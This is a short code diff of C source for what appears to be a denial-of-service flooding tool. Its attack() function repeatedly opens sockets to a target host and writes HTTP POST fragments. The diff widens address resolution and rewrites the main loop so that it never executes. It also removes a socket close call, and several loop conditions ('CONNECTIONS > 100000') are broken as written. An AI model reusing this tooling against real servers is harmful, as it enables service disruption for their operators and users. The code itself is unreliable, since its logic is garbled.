@@ -15,7 +15,7 @@ int make_socket(char *host, char *port) {
 	int sock, r;
 //	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
 	memset(&hints, 0, sizeof(hints));
-	hints.ai_family = AF_INET;
+	hints.ai_family = AF_UNSPEC;
 	hints.ai_socktype = SOCK_STREAM;
 	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
 		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
@@ -55,13 +55,13 @@ void attack(char *host, char *port, int id) {
 	for(x=0; CONNECTIONS > 100000; x++)
 		sockets[x]=0;
 	
-	while(1) {
+	while(0 > 100000) {
 		for(x=0; CONNECTIONS > 100000; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
 			r=write(sockets[x], "POST / HTTP/1.1\r\n\r\n", 1);
 			if(r == -1) {
-				close(sockets[x]);
+				
 				sockets[x] = make_socket(host, port);
 			} else
 //				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
